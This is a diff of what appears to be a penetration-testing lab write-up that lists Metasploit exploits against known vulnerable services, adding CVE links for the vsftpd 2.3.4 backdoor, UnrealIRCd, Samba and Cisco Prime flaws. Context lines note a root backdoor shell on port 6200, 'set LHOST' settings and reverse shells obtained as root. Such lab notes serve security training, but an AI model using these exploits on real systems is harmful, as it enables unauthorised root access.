@@ -34,6 +34,8 @@ run
 - **Notes:**
   - Opens a root shell backdoor on port 6200
   - Triggered by logging in with a `:)` in the username
+- **Result:** `root`  
+- **CVE:** [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)  
 
 ---
 
@@ -48,7 +50,7 @@ run
   set LHOST <Kali IP>
   ```
 - **Result:** Reverse shell as `root`  
-- **CVE:** [CVE-2010-2075](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2075)
+- **CVE:** [CVE-2010-2075](https://nvd.nist.gov/vuln/detail/CVE-2010-2075)
 
 ---
 
@@ -63,6 +65,7 @@ run
   set LHOST <Kali IP>
   ```
 - **Result:** Reverse shell as `root`  
+- **CVE:** [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)
 
 ---
 
@@ -77,6 +80,7 @@ run
   set LHOST <Kali IP>
   ```
 - **Result:** Exploit completed but no session created, requires **manual placement of JSP payload** in `/opt/CSCOlumos` 
+- **CVE:** [CVE-2018-15379](https://nvd.nist.gov/vuln/detail/CVE-2018-15379)
 
 ---
 
